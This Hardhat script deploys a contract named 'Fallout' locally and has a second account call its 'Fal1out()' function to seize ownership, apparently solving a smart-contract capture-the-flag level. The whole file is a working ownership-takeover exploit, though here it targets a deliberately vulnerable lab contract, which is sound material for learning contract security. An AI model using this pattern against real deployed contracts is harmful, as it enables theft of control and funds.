
const hre = require("hardhat");

async function main() {

  const [deployer, signer0, signer1] = await hre.ethers.getSigners();

  console.log("signer0:", signer0.address);
  console.log("signer1:", signer1.address);

  const contract = await hre.ethers.deployContract("Fallout", signer0);
  console.log("Contract deployed to address:", contract.address);
  console.log("Contract owner:", await contract.owner());

  const contract1 = await hre.ethers.getContractAt("Fallout", contract.address, signer1);
  
  await contract1.Fal1out();

  console.log("Contract owner:", await contract.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
